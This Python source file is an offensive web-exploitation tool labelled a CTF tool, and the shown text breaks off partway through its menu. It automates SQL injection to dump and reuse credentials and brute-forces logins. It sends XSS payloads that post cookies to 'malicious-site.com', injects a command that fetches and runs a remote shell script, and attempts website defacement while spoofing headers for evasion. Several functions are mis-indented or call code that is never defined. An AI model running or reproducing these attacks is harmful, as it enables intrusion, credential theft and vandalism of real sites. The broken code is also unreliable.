import requests
import threading
import json
import os
import ssl
import socket
import base64
import random
import time
import re
from fake_useragent import UserAgent
from datetime import datetime
from fpdf import FPDF
from colorama import Fore, Style, init

init(autoreset=True)

# Directory to save found files
os.makedirs("found_files", exist_ok=True)

def print_ascii_art():
    print(Fore.RED + Style.BRIGHT + r"""
                         /$$                           /$$           /$$   /$$    
                        | $$                          | $$          |__/  | $$    
 /$$  /$$  /$$  /$$$$$$ | $$$$$$$  /$$   /$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$  
| $$ | $$ | $$ /$$__  $$| $$__  $$|  $$ /$$/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/  
| $$ | $$ | $$| $$$$$$$$| $$  \ $$ \  $$$$/ | $$  \ $$| $$| $$  \ $$| $$  | $$    
| $$ | $$ | $$| $$_____/| $$  | $$  >$$  $$ | $$  | $$| $$| $$  | $$| $$  | $$ /$$
|  $$$$$/$$$$/|  $$$$$$$| $$$$$$$/ /$$/\  $$| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/
 \_____\___/  \_______/|_______/ |__/  \__/| $$____/ |__/ \______/ |__/   \___/  
                                            | $$                                  
                                            | $$                                  
                                            |__/                                  

                                   Created by Mal
    """)

def main_menu():
    print(Fore.CYAN + """
    ================================
    Advanced CTF Exploitation Tool
    ================================
    1. Scanning and Recon
    2. Testing
    3. Exploitation
    4. Reporting
    5. Exit
    """ + Style.RESET_ALL)
    return input(Fore.GREEN + "Select an option: " + Style.RESET_ALL)

def scanning_menu():
    print(Fore.CYAN + """
    ================================
    Scanning and Recon Menu
    ================================
    1. Parameter Discovery
    2. Subdomain Enumeration
    3. Nmap Integration
    4. API Enumeration
    5. Back to Main Menu
    """ + Style.RESET_ALL)
    return input(Fore.GREEN + "Select an option: " + Style.RESET_ALL)

def discover_parameters(target_url):
    """
    Discovers potential injectable parameters on the target URL.
    """
    print(Fore.CYAN + "[*] Attempting parameter discovery...")
    params = []
    potential_params = ["id", "user", "name", "search", "query", "email"]
    for param in potential_params:
        test_url = f"{target_url}?{param}=' OR '1'='1"
        try:
            response = requests.get(test_url)
            if "sql" in response.text.lower() or response.status_code == 500:
                print(Fore.GREEN + f"[+] Parameter '{param}' appears vulnerable!")
                params.append(param)
        except Exception as e:
            print(Fore.RED + f"[!] Error testing parameter '{param}': {e}")
    return params


def subdomain_enum(domain, wordlist_path):
    print(Fore.CYAN + "[+] Starting Subdomain Enumeration...")
    try:
        subdomains = []
        with open(wordlist_path, "r") as wordlist:
            for sub in wordlist:
                sub = sub.strip()
                url = f"http://{sub}.{domain}"
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(Fore.GREEN + f"[+] Found subdomain: {url}")
                        subdomains.append(url)
                except:
                    pass
        return subdomains
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

def run_nmap_scan(target):
    print(Fore.CYAN + f"[+] Running Nmap scan on {target}...")
    os.system(f"nmap -A -T4 {target} > nmap_scan.txt")
    try:
        with open("nmap_scan.txt", "r") as f:
            print(f.read())
    except FileNotFoundError:
        print(Fore.RED + "[!] Nmap scan failed. Ensure Nmap is installed.")

def enumerate_api(target_url):
    print(Fore.CYAN + "[+] Enumerating API Endpoints...")
    endpoints = ["/api/v1/users", "/api/v1/orders", "/api/v1/products"]  # Example endpoints
    for endpoint in endpoints:
        try:
            response = requests.get(target_url + endpoint)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Found API Endpoint: {target_url}{endpoint}")
            else:
                print(Fore.YELLOW + f"[!] No response from: {target_url}{endpoint}")
        except Exception as e:
            print(Fore.RED + f"[!] Error testing {endpoint}: {e}")

def testing_menu():
    print(Fore.CYAN + """
    ================================
    Web Application Testing Menu
    ================================
    1. Test for Missing Security Headers
    2. Test for CORS Misconfiguration
    3. Test for Open Redirects
    4. Test for Insecure Cookies
    5. Check for Files on Website
    6. Test API Security
    7. Test SSL/TLS Configuration
    8. Test for SQL Injection
    9. Back to Main Menu
    """ + Style.RESET_ALL)
    return input(Fore.GREEN + "Select an option: " + Style.RESET_ALL)

def exploit_missing_security_headers(url):
    try:
        response = requests.get(url)
        missing_headers = []

        if 'X-Content-Type-Options' not in response.headers:
            missing_headers.append('X-Content-Type-Options')

        if 'Content-Security-Policy' not in response.headers:
            missing_headers.append('Content-Security-Policy')

        if 'X-Frame-Options' not in response.headers:
            missing_headers.append('X-Frame-Options')

        if missing_headers:
            print(Fore.YELLOW + f"[!] Missing security headers: {', '.join(missing_headers)}")
            return {"missing_headers": missing_headers}
        else:
            print(Fore.GREEN + "[+] All necessary security headers are present.")
            return {"missing_headers": []}

    except requests.exceptions.InvalidSchema as e:
        print(Fore.RED + f"[!] Invalid URL schema: {url}")
    except Exception as e:
        print(Fore.RED + f"[!] Error checking security headers: {e}")
    return {}


def test_cors_misconfiguration(url):
    headers = {'Origin': 'http://malicious-site.com'}
    try:
        response = requests.get(url, headers=headers)
        if 'Access-Control-Allow-Origin' in response.headers and response.headers['Access-Control-Allow-Origin'] == '*':
            print(Fore.RED + "[!] CORS misconfiguration found!")
            return {"cors_misconfiguration": True}
        else:
            print(Fore.GREEN + "[+] CORS configuration is secure.")
            return {"cors_misconfiguration": False}
    except Exception as e:
        print(Fore.RED + f"[!] CORS Test Failed: {e}")
        return {"cors_misconfiguration": "error"}
    
def test_open_redirects(url):
    redirect_url = f"{url}/redirect?url=http://malicious-site.com"
    try:
        response = requests.get(redirect_url, allow_redirects=False)
        if response.status_code in [301, 302] and 'Location' in response.headers and 'http://malicious-site.com' in response.headers['Location']:
            print(Fore.RED + "[!] Open redirect vulnerability found!")
            return {"open_redirect": True}
        else:
            print(Fore.GREEN + "[+] No open redirect vulnerability detected.")
            return {"open_redirect": False}
    except Exception as e:
        print(Fore.RED + f"[!] Open Redirect Test Failed: {e}")
        return {"open_redirect": "error"}

def test_insecure_cookies(url):
    try:
        response = requests.get(url)
        cookies = response.headers.get('Set-Cookie', '')
        insecure_cookies = [cookie for cookie in cookies.split(',') if 'Secure' not in cookie or 'HttpOnly' not in cookie]
        if insecure_cookies:
            print(Fore.RED + f"[!] Insecure cookies found: {insecure_cookies}")
            return {"insecure_cookies": insecure_cookies}
        else:
            print(Fore.GREEN + "[+] All cookies are secure.")
            return {"insecure_cookies": False}
    except Exception as e:
        print(Fore.RED + f"[!] Cookie Test Failed: {e}")
        return {"insecure_cookies": "error"}


def check_files_on_website(url):
    print(Fore.CYAN + "[+] Checking for common files on the website...")
    common_files = ["robots.txt", "sitemap.xml", "admin", "login", "config.php", ".env"]
    found_files = []

    for file in common_files:
        file_url = f"{url}/{file}"
        try:
            response = requests.get(file_url)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Found: {file_url}")
                found_files.append(file_url)
            else:
                print(Fore.YELLOW + f"[-] Not found: {file_url}")
        except Exception as e:
            print(Fore.RED + f"[!] Error checking {file_url}: {e}")

    return {"found_files": found_files}

def test_api_security(api_url):
    print(Fore.CYAN + "[+] Testing API Security...")
    results = {}

    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            results['api_status'] = "online"
            print(Fore.GREEN + "[+] API is online.")
        else:
            results['api_status'] = "offline"
            print(Fore.RED + f"[!] API is offline. Status code: {response.status_code}")
    except Exception as e:
        results['api_status'] = "error"
        print(Fore.RED + f"[!] API test failed: {e}")

    return {"api_security": results}

def test_ssl_tls_configuration(url):
    print(Fore.CYAN + "[+] Testing SSL/TLS Configuration...")
    results = {}

    try:
        # Extract hostname from the URL
        hostname = url.replace("http://", "").replace("https://", "").split("/")[0]
        port = 443

        context = ssl.create_default_context()
        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()

                # Check certificate expiration
                not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                results['certificate_expiration'] = not_after.strftime('%Y-%m-%d %H:%M:%S')
                if not_after < datetime.now():
                    print(Fore.RED + f"[!] SSL Certificate is expired! Expired on: {not_after}")
                else:
                    print(Fore.GREEN + f"[+] SSL Certificate is valid. Expiration Date: {not_after}")

                # Check certificate issuer
                issuer = dict(x[0] for x in cert['issuer'])
                results['certificate_issuer'] = issuer.get('organizationName', 'Unknown')
                print(Fore.CYAN + f"[+] Certificate Issuer: {results['certificate_issuer']}")

                # Check SSL version
                results['ssl_version'] = ssock.version()
                print(Fore.CYAN + f"[+] SSL Version: {results['ssl_version']}")

    except ssl.SSLError as e:
        print(Fore.RED + f"[!] SSL/TLS error: {e}")
        results['ssl_error'] = str(e)
    except socket.error as e:
        print(Fore.RED + f"[!] Socket error: {e}")
        results['socket_error'] = str(e)
    except Exception as e:
        print(Fore.RED + f"[!] Unexpected error: {e}")
        results['unexpected_error'] = str(e)

    return {"ssl_tls_configuration": results}


def test_sql_injection(url):
    print(Fore.CYAN + "[+] Testing for SQL Injection vulnerabilities...")

    # A list of common SQL Injection payloads
    payloads = [
        "' OR '1'='1 --",
        "' UNION SELECT NULL, NULL --",
        "admin' --",
        "' AND '1'='1",
        "\" OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "' OR sleep(5) --",
        "' AND sleep(5) --"
    ]

    vulnerable = False

    for payload in payloads:
        try:
            # Send the payload as part of the query string
            target_url = f"{url}?q={payload}"
            print(Fore.YELLOW + f"[*] Testing payload: {payload}")
            response = requests.get(target_url)

            # Check for common SQL error messages in the response
            if (
                "SQL syntax" in response.text
                or "mysql_fetch" in response.text
                or "sql" in response.text.lower()
                or response.status_code == 500
            ):
                print(Fore.RED + f"[!] SQL Injection vulnerability detected with payload: {payload}")
                vulnerable = True
                break
        except Exception as e:
            print(Fore.RED + f"[!] Error testing SQL Injection: {e}")

    if vulnerable:
        print(Fore.RED + "[!] The target is vulnerable to SQL Injection.")
        print(Fore.CYAN + "Recommendation: Use parameterized queries or prepared statements to mitigate SQL Injection vulnerabilities." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "[+] No SQL Injection vulnerabilities detected.")

    return {"sql_injection": vulnerable}


def exploitation_menu():
    print(Fore.CYAN + """
    ================================
    Exploitation Menu
    ================================
    1. SQL Injection
    2. XSS Exploitation
    3. Command Injection
    4. Brute-Force Login
    5. Advanced CORS Exploitation
    6. DNS Rebinding
    7. Persistent XSS
    8. Full Exploitation Chain Automation
    9. Back to Main Menu
    """ + Style.RESET_ALL)
    return input(Fore.GREEN + "Select an exploit to attempt: " + Style.RESET_ALL)


def exploit_sql_injection(url):
    print(Fore.YELLOW + "[*] Exploiting SQL Injection...")
    
    # Payloads for exploitation
    payloads = [
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --",
        "' OR '1'='1 --",
        "' UNION SELECT 1, @@version --",
    ]

    for payload in payloads:
        try:
            exploit_url = f"{url}?q={payload}"
            response = requests.get(exploit_url)
            
            if response.status_code == 200 and "username" in response.text:
                print(Fore.GREEN + f"[+] Exploit Successful with payload: {payload}")
                print(Fore.YELLOW + "[*] Response:")
                print(Fore.YELLOW + response.text[:500])  # Display first 500 chars of the response
                break
        except Exception as e:
            print(Fore.RED + f"[!] Exploit failed with payload {payload}: {e}")


    def exploit_xss_automated(url):
        print(Fore.CYAN + "[+] Launching XSS Exploitation...")

    payloads = [
        "<script>alert('XSS');</script>",
        "<script>fetch('http://malicious-site.com/steal?cookie=' + document.cookie);</script>",
        "<img src=x onerror=alert(1)>",
        "<script src='http://malicious-site.com/malicious.js'></script>"
    ]

    for payload in payloads:
        try:
            # Inject payload via POST request
            print(Fore.YELLOW + f"[*] Sending XSS payload: {payload}")
            response = requests.post(url, data={"input": payload})

            if payload in response.text:
                print(Fore.RED + f"[!] XSS vulnerability confirmed with payload: {payload}")
                print(Fore.GREEN + f"[+] Injected Content:\n{response.text[:500]}")
                break
            else:
                print(Fore.GREEN + f"[+] Payload not reflected: {payload}")
        except Exception as e:
            print(Fore.RED + f"[!] Error during XSS Exploitation: {e}")

    print(Fore.CYAN + "Exploitation complete. Review the results above." + Style.RESET_ALL)

def exploit_command_injection_automated(url):
    print(Fore.CYAN + "[+] Launching Command Injection Exploitation...")

    payloads = [
        "1; cat /etc/passwd",
        "1 && whoami",
        "1 && uname -a",
        "1 && curl http://malicious-site.com/shell.sh | bash"
    ]

    for payload in payloads:
        try:
            target_url = f"{url}?cmd={payload}"
            print(Fore.YELLOW + f"[*] Sending Command Injection payload: {payload}")
            response = requests.get(target_url)

            if response.status_code == 200:
                print(Fore.RED + f"[!] Command executed successfully with payload: {payload}")
                print(Fore.GREEN + f"[!] Response:\n{response.text[:500]}")
                break
            else:
                print(Fore.GREEN + f"[+] Command Injection attempt failed: {payload}")
        except Exception as e:
            print(Fore.RED + f"[!] Error during Command Injection Exploitation: {e}")

    print(Fore.CYAN + "Exploitation complete. Review the results above." + Style.RESET_ALL)

def brute_force_login(url, username_field, password_field, usernames, passwords):
    print(Fore.CYAN + "[+] Starting brute-force attack...")
    for username in usernames:
        for password in passwords:
            data = {username_field: username, password_field: password}
            try:
                response = requests.post(url, data=data)
                if response.status_code == 200 and "welcome" in response.text.lower():
                    print(Fore.GREEN + f"[+] Credentials found: {username}:{password}")
                    return username, password
            except Exception as e:
                print(Fore.RED + f"[!] Error: {e}")
    print(Fore.RED + "[!] Brute-force attack failed. No credentials found.")
    return None

def advanced_cors_exploit(target_url):
    """
    Exploits CORS Misconfiguration to extract sensitive data or demonstrate potential vulnerabilities.
    """
    print(Fore.CYAN + "[+] Starting Advanced CORS Exploitation...")

    # JavaScript payload for exploitation
    exploit_payload = f"""
    fetch('{target_url}/sensitive-endpoint', {{
        method: 'GET',
        credentials: 'include'
    }})
    .then(response => response.text())
    .then(data => {{
        console.log('Extracted data:', data);
        alert('Extracted data: ' + data);
    }})
    .catch(error => console.error('Error:', error));
    """

    print(Fore.YELLOW + "[*] Use the following JavaScript payload to exploit the CORS vulnerability:")
    print(Fore.GREEN + exploit_payload)

    # Additional instructions
    print(Fore.CYAN + "[*] Host this script on a domain allowed by the server's CORS policy to test the exploit.")
    print(Fore.CYAN + "[*] If credentials are required, ensure they are included in the request.")

    # Output exploitation attempt
    print(Fore.CYAN + "[+] CORS exploitation payload generated successfully.")

def dns_rebinding(target_url):
    print(Fore.CYAN + "[+] Performing DNS Rebinding...")
    payload = f"""
    <script>
        const target = "http://127.0.0.1:3000";
        fetch(target).then(response => response.text()).then(data => {{
            console.log("Data from internal service:", data);
        }});
    </script>
    """
    print(Fore.YELLOW + f"[!] Use this payload on a malicious domain:\n{payload}")

def check_advanced_website_files(url):
    print(Fore.CYAN + "[*] Checking for Sensitive Files with Advanced Techniques...")

    # Common files and directories to check
    common_files = [
        "robots.txt",
        ".env",
        "config.php",
        "backup.zip",
        "database.sql",
        "sitemap.xml",
        "admin.html",
        ".git/config",
        ".htaccess",
        ".htpasswd"
    ]

    # Randomized headers for evasion
    user_agent = UserAgent()
    headers = {
        "User-Agent": user_agent.random,
        "Referer": f"{url}/dashboard",
        "X-Forwarded-For": f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"
    }

    found_files = []
    for file in common_files:
        file_url = f"{url}/{file}"
        try:
            response = requests.get(file_url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Found: {file_url}")
                found_files.append(file_url)

                # Save the file locally
                with open(f"found_files/{file}", "wb") as f:
                    f.write(response.content)
                print(Fore.GREEN + f"[+] Saved file: found_files/{file}")

            else:
                print(Fore.YELLOW + f"[!] File not found or restricted: {file_url}")

            # Random delay to mimic human browsing
            time.sleep(random.uniform(1, 3))

        except Exception as e:
            print(Fore.RED + f"[!] Error checking file {file}: {e}")

    if not found_files:
        print(Fore.RED + "[!] No sensitive files found.")
    return found_files


def attempt_advanced_website_defacement(url):
    print(Fore.CYAN + "[*] Attempting Advanced Website Defacement...")

    # Obfuscated payloads
    payloads = [
        {"title": "Hacked by XYZ", "content": base64.b64encode(b"<h1>Your site is hacked!</h1>").decode()},
        {"title": "Security Breach", "content": "<script>alert('Defaced');</script>"},
        {"title": "Oops!", "content": "%3Ch1%3EHacked%3C%2Fh1%3E"}
    ]

    # Dynamic endpoints
    common_endpoints = [
        f"{url}/admin/edit",
        f"{url}/content/update",
        f"{url}/page/editor",
        f"{url}/admin/dashboard"
    ]

    success = False
    for endpoint in common_endpoints:
        for payload in payloads:
            try:
                print(Fore.YELLOW + f"[*] Trying payload at {endpoint}...")
                response = requests.post(endpoint, data=payload)

                # Check if defacement succeeded
                if response.status_code == 200 and "Hacked" in response.text:
                    print(Fore.GREEN + f"[+] Successfully defaced endpoint: {endpoint}")
                    success = True
                    break
                else:
                    print(Fore.YELLOW + f"[!] Endpoint not vulnerable or payload failed: {endpoint}")
            except Exception as e:
                print(Fore.RED + f"[!] Error during defacement attempt: {e}")

            # Random delay to mimic human behavior
            time.sleep(random.uniform(1, 3))

        if success:
            break

    if not success:
        print(Fore.RED + "[!] Defacement failed. No vulnerable endpoints found.")
    return success

def exploit_persistent_xss(target_url, token):
    print(Fore.CYAN + "[+] Testing Persistent XSS on Last Login IP...")
    headers = {"Authorization": f"Bearer {token}"}
    payload = "<script>alert('Persistent XSS');</script>"
    data = {"lastLoginIp": payload}

    try:
        response = requests.patch(f"{target_url}/rest/user/me", json=data, headers=headers)
        if response.status_code == 200:
            print(Fore.RED + f"[!] Persistent XSS successful. Payload: {payload}")
        else:
            print(Fore.YELLOW + f"[+] Persistent XSS failed: {response.text}")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

def extract_credentials_from_sql(target_url):
    """
    Exploits SQL Injection to extract credentials from a vulnerable database.
    Assumes that a 'users' table exists with columns like username and password.
    """
    print(Fore.YELLOW + "[*] Attempting to extract credentials via SQL Injection...")

    # Example payloads for extracting credentials
    payloads = [
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT NULL, email, password FROM users --",
        "' UNION SELECT username, password, NULL FROM users --"
    ]

    credentials = {}

    for payload in payloads:
        try:
            exploit_url = f"{target_url}?q={payload}"
            print(Fore.YELLOW + f"[*] Sending payload: {payload}")
            response = requests.get(exploit_url)

            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Payload succeeded: {payload}")
                print(Fore.YELLOW + "[*] Raw Response:")
                print(response.text[:500])  # Log the first 500 characters of the response

                # Parse the response to extract credentials
                extracted_data = parse_credentials(response.text)
                credentials.update(extracted_data)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to extract credentials with payload {payload}: {e}")

    if not credentials:
        print(Fore.YELLOW + "[!] No credentials were extracted. Potential reasons:")
        print(Fore.YELLOW + "    - The target is not vulnerable to SQL Injection.")
        print(Fore.YELLOW + "    - The response format is not recognized by the parser.")
        print(Fore.YELLOW + "    - Adjust the payloads or parser to better match the target's schema.")
    else:
        print(Fore.GREEN + "[+] Extracted credentials:")
        for username, password in credentials.items():
            print(Fore.CYAN + f"    Username: {username}, Password: {password}")

    return credentials

def parse_credentials(response_text):
    """
    Parses the server's response to extract credentials.
    Assumes credentials are returned in a tabular or JSON-like format.
    """
    credentials = {}
    try:
        # Try to identify JSON-like responses
        if "{" in response_text and "}" in response_text:
            data = json.loads(response_text)
            # Adjust based on the structure of the response
            for user in data.get("users", []):
                username = user.get("username")
                password = user.get("password")
                if username and password:
                    credentials[username] = password
        else:
            # Fallback for plaintext/tabular responses
            lines = response_text.splitlines()
            for line in lines:
                if "username" in line.lower() and "password" in line.lower():
                    parts = line.split()
                    username = parts[parts.index("username") + 1].strip(",")
                    password = parts[parts.index("password") + 1].strip(",")
                    credentials[username] = password
    except Exception as e:
        print(Fore.RED + f"[!] Failed to parse credentials: {e}")
    return credentials


def generate_report(results):
    """
    Generates a detailed PDF report of the exploitation results.
    :param results: Dictionary containing the results of the exploitation chain.
    """
    print(Fore.CYAN + "[+] Generating Exploitation Report...")
    try:
        report_path = "exploitation_report.pdf"
        pdf = FPDF()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.add_page()
        pdf.set_font("Arial", size=12)

        # Report Header
        pdf.set_font("Arial", size=16, style="B")
        pdf.cell(200, 10, txt="Exploitation Report", ln=True, align="C")
        pdf.set_font("Arial", size=12)
        pdf.ln(10)

        # Summary of Results
        pdf.cell(0, 10, txt="Summary of Results:", ln=True)
        pdf.ln(5)
        for key, value in results.items():
            pdf.multi_cell(0, 10, txt=f"{key}: {json.dumps(value, indent=4)}")
            pdf.ln(5)

        # Add detailed sections
        if results.get("testing"):
            pdf.cell(0, 10, txt="Vulnerability Testing Results:", ln=True)
            pdf.ln(5)
            for test, outcome in results["testing"].items():
                pdf.multi_cell(0, 10, txt=f"{test}: {json.dumps(outcome, indent=4)}")
                pdf.ln(5)

        if results.get("exploitation"):
            pdf.cell(0, 10, txt="Exploitation Results:", ln=True)
            pdf.ln(5)
            for exploit, outcome in results["exploitation"].items():
                pdf.multi_cell(0, 10, txt=f"{exploit}: {json.dumps(outcome, indent=4)}")
                pdf.ln(5)

        # Save the report
        pdf.output(report_path)
        print(Fore.GREEN + f"[+] Report generated successfully: {report_path}")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to generate report: {e}")


def full_exploitation_chain(target_url):
    """
    Automates the process of testing and exploiting web vulnerabilities.
    """
    print(Fore.CYAN + "[+] Starting Full Exploitation Chain Automation...\n")

    # Initialize results dictionary to track findings
    results = {
        "valid_target": False,
        "scanning": {},
        "testing": {},
        "exploitation": {}
    }

    # Step 1: Validate Target
    print(Fore.YELLOW + "[*] Validating target...")
    try:
        response = requests.get(target_url, timeout=10)
        if response.status_code == 200:
            results["valid_target"] = True
            print(Fore.GREEN + f"[+] Target is live: {target_url}")
        else:
            print(Fore.RED + f"[!] Target is unreachable: HTTP {response.status_code}")
            return
    except Exception as e:
        print(Fore.RED + f"[!] Target validation failed: {e}")
        return

    # Step 2: Parameter Discovery
    print(Fore.YELLOW + "\n[*] Discovering parameters and endpoints...")
    params = discover_parameters(target_url)
    results["scanning"]["parameters"] = params
    print(Fore.GREEN + f"[+] Discovered parameters: {params}" if params else Fore.YELLOW + "[!] No parameters found.")

    # Step 3: Subdomain Enumeration
    print(Fore.YELLOW + "\n[*] Enumerating subdomains...")
    wordlist = "subdomains.txt"  # Update this with your wordlist
    domain = target_url.split("//")[-1].split("/")[0]
    subdomains = subdomain_enum(domain, wordlist)
    results["scanning"]["subdomains"] = subdomains
    print(Fore.GREEN + f"[+] Discovered subdomains: {subdomains}" if subdomains else Fore.YELLOW + "[!] No subdomains found.")

    # Step 4: Advanced File Discovery
    print(Fore.YELLOW + "\n[*] Checking for sensitive files...")
    found_files = check_advanced_website_files(target_url)
    results["scanning"]["files"] = found_files

    # Step 5: Vulnerability Testing
    print(Fore.YELLOW + "\n[*] Testing for vulnerabilities...")

    # Missing Security Headers
    headers_result = exploit_missing_security_headers(target_url)
    results["testing"]["missing_headers"] = headers_result

    # CORS Misconfiguration
    cors_result = test_cors_misconfiguration(target_url)
    results["testing"]["cors_misconfiguration"] = cors_result

    # Open Redirects
    redirect_result = test_open_redirects(target_url)
    results["testing"]["open_redirect"] = redirect_result

    # Insecure Cookies
    cookie_result = test_insecure_cookies(target_url)
    results["testing"]["insecure_cookies"] = cookie_result

    # SQL Injection
    sql_result = test_sql_injection(target_url)
    results["testing"]["sql_injection"] = sql_result

    # Step 6: Exploitation
    print(Fore.YELLOW + "\n[*] Analyzing vulnerabilities for exploitation...")

    if headers_result.get("missing_headers"):
        print(Fore.CYAN + "[*] Exploiting Missing Security Headers...")
        exploit_missing_security_headers(target_url)  # Exploit logic if applicable

    if cors_result.get("cors_misconfiguration"):
        print(Fore.CYAN + "[*] Exploiting CORS Misconfiguration...")
        advanced_cors_exploit(target_url)

    if redirect_result.get("open_redirect"):
        print(Fore.CYAN + "[*] Exploiting Open Redirect Vulnerability...")
        exploit_open_redirect(target_url)

    if sql_result.get("sql_injection"):
        print(Fore.CYAN + "[*] Exploiting SQL Injection...")
        exploit_sql_injection(target_url)

    # Step 7: Advanced Website Defacement
    print(Fore.YELLOW + "\n[*] Attempting advanced website defacement...")
    defacement_success = attempt_advanced_website_defacement(target_url)
    results["exploitation"]["defacement"] = defacement_success

    # Step 8: Privilege Escalation (if possible)
    print(Fore.YELLOW + "\n[*] Attempting privilege escalation (if credentials are available)...")
    credentials = extract_credentials_from_sql(target_url)
    if credentials:
        for username, password in credentials.items():
            print(Fore.CYAN + f"[+] Attempting login with {username}:{password}...")
            cookies = login(target_url, username, password)
            if cookies:
                print(Fore.GREEN + f"[+] Privilege escalation successful for {username}!")
                results["exploitation"]["privilege_escalation"] = {"username": username, "cookies": cookies}

    # Step 9: Generate Detailed Report
    print(Fore.CYAN + "\n[+] Exploitation Chain Complete! Generating Detailed Report...")
    generate_report(results)
    print(Fore.GREEN + "[+] Report saved successfully.")


if __name__ == "__main__":
    print_ascii_art()
    results = {}
    while True:
        print(Fore.CYAN + """
        ================================
        Advanced CTF Exploitation Tool
        ================================
        1. Scanning and Recon
        2. Web Application Testing
        3. Exploitation
        4. Full Exploitation Chain Automation
        5. Reporting
        6. Exit
        """ + Style.RESET_ALL)
        choice = input(Fore.GREEN + "Select an option: " + Style.RESET_ALL)

        if choice == "1":  # Scanning and Recon Menu
            while True:
                print(Fore.CYAN + """
                ================================
                Scanning and Recon Menu
                ================================
                1. Discover Parameters
                2. Enumerate Subdomains
                3. Run Nmap Scan
                4. API Endpoint Discovery
                5. Back to Main Menu
                """ + Style.RESET_ALL)
                scan_choice = input(Fore.GREEN + "Select a scanning option: " + Style.RESET_ALL)
                
                if scan_choice == "1":
                    target_url = input(Fore.GREEN + "Enter target URL for Parameter Discovery: " + Style.RESET_ALL)
                    params = discover_parameters(target_url)
                    results["parameters"] = params
                elif scan_choice == "2":
                    domain = input(Fore.GREEN + "Enter the target domain: " + Style.RESET_ALL)
                    wordlist = input(Fore.GREEN + "Enter the path to the subdomain wordlist: " + Style.RESET_ALL)
                    subdomains = subdomain_enum(domain, wordlist)
                    results["subdomains"] = subdomains
                elif scan_choice == "3":
                    target = input(Fore.GREEN + "Enter target IP or domain for Nmap scan: " + Style.RESET_ALL)
                    run_nmap_scan(target)
                elif scan_choice == "4":
                    target_url = input(Fore.GREEN + "Enter target URL for API Discovery: " + Style.RESET_ALL)
                    enumerate_api(target_url)
                elif scan_choice == "5":
                    break
                else:
                    print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)

        elif choice == "2":  # Web Application Testing Menu
            while True:
                print(Fore.CYAN + """
                ================================
                Web Application Testing Menu
                ================================
                1. Test for Missing Security Headers
                2. Test for CORS Misconfiguration
                3. Test for Open Redirects
                4. Test for Insecure Cookies
                5. Test for SQL Injection
                6. Test SSL/TLS Configuration
                7. Back to Main Menu
                """ + Style.RESET_ALL)
                test_choice = input(Fore.GREEN + "Select a testing option: " + Style.RESET_ALL)
                
                if test_choice == "1":
                    target_url = input(Fore.GREEN + "Enter target URL for Security Headers Test: " + Style.RESET_ALL)
                    results.update(exploit_missing_security_headers(target_url))
                elif test_choice == "2":
                    target_url = input(Fore.GREEN + "Enter target URL for CORS Misconfiguration Test: " + Style.RESET_ALL)
                    results.update(test_cors_misconfiguration(target_url))
                elif test_choice == "3":
                    target_url = input(Fore.GREEN + "Enter target URL for Open Redirect Test: " + Style.RESET_ALL)
                    results.update(test_open_redirects(target_url))
                elif test_choice == "4":
                    target_url = input(Fore.GREEN + "Enter target URL for Insecure Cookies Test: " + Style.RESET_ALL)
                    results.update(test_insecure_cookies(target_url))
                elif test_choice == "5":
                    target_url = input(Fore.GREEN + "Enter target URL for SQL Injection Test: " + Style.RESET_ALL)
                    results.update(test_sql_injection(target_url))
                elif test_choice == "6":
                    target_url = input(Fore.GREEN + "Enter target URL for SSL/TLS Configuration Test: " + Style.RESET_ALL)
                    results.update(test_ssl_tls_config(target_url))
                elif test_choice == "7":
                    break
                else:
                    print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)

        elif choice == "3":  # Exploitation Menu
            while True:
                print(Fore.CYAN + """
                ================================
                Exploitation Menu
                ================================
                1. SQL Injection Exploit
                2. XSS Exploitation
                3. Command Injection Exploit
                4. Advanced CORS Exploitation
                5. Open Redirect Exploitation
                6. Persistent XSS Exploitation
                7. Full Exploitation Chain Automation
                8. Back to Main Menu
                """ + Style.RESET_ALL)
                exploit_choice = input(Fore.GREEN + "Select an exploit to attempt: " + Style.RESET_ALL)
                
                if exploit_choice == "1":
                    target_url = input(Fore.GREEN + "Enter target URL for SQL Injection Exploitation: " + Style.RESET_ALL)
                    exploit_sql_injection(target_url)
                elif exploit_choice == "2":
                    target_url = input(Fore.GREEN + "Enter target URL for XSS Exploitation: " + Style.RESET_ALL)
                    xss_payloads = generate_payload("xss", target_url)
                    for payload in xss_payloads:
                        print(Fore.YELLOW + f"[*] Attempting payload: {payload}")
                        # Execute or log payload
                elif exploit_choice == "3":
                    target_url = input(Fore.GREEN + "Enter target URL for Command Injection: " + Style.RESET_ALL)
                    command_payloads = generate_payload("command_injection", target_url)
                    for payload in command_payloads:
                        print(Fore.YELLOW + f"[*] Attempting payload: {payload}")
                        # Execute or log payload
                elif exploit_choice == "4":
                    target_url = input(Fore.GREEN + "Enter target URL for CORS Exploitation: " + Style.RESET_ALL)
                    advanced_cors_exploit(target_url)
                elif exploit_choice == "5":
                    target_url = input(Fore.GREEN + "Enter target URL for Open Redirect Exploitation: " + Style.RESET_ALL)
                    open_redirect_payloads = generate_payload("open_redirect", target_url)
                    for payload in open_redirect_payloads:
                        print(Fore.YELLOW + f"[*] Exploit URL: {payload}")
                elif exploit_choice == "6":
                    print(Fore.YELLOW + "[!] Persistent XSS Exploitation is coming soon!" + Style.RESET_ALL)
                elif exploit_choice == "7":
